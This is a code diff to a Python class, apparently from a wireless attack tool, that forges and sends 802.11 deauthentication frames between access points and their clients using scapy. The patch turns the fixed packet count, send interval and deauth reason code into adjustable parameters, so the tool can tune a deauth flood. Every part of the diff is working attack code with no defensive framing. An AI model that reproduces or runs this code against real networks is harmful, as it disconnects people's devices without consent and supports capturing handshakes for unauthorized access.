@@ -38,7 +38,7 @@ class CAPTURE:
 
 	FIRSTSTORE= True
 
-	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, stations, outfname):
+	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, stations, outfname, pkts, code, delay):
 		self.interface = iface
 		self.bssid = bssid
 		self.essid = essid
@@ -50,6 +50,9 @@ class CAPTURE:
 		self.auth    = auth
 		self.stations = stations
 		self.output   = self.output(outfname)
+		self.pcounter = pkts
+		self.code     = code
+		self.delay    = delay
 
 	def output(self, ofname):
 		if ofname.endswith(".cap") or ofname.endswith(".pcap"):
@@ -92,7 +95,7 @@ class CAPTURE:
 						addr2=sn,
 						addr3=sn
 					) / Dot11Deauth(
-						reason=7
+						reason=self.code
 					)
 
 			return pkt
@@ -122,8 +125,8 @@ class CAPTURE:
 		sendp(
 			pkt,
 			iface=self.interface,
-			count=25,
-			inter=0.01,
+			count=self.pcounter,
+			inter=self.delay,
 			verbose=False
 		)
 
@@ -172,7 +175,7 @@ class CAPTURE:
 					pull.print(
 						"-",
 						"Deauth Sent. CODE [{code}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
-							code     =pull.RED+str(7)+pull.END,
+							code     =pull.RED+str(self.code)+pull.END,
 							apvendor =pull.DARKCYAN+pull.get_mac(ap)+pull.END,
 							ap       =ap.upper(),
 							stavendor=pull.DARKCYAN+pull.get_mac(sta)+pull.END,
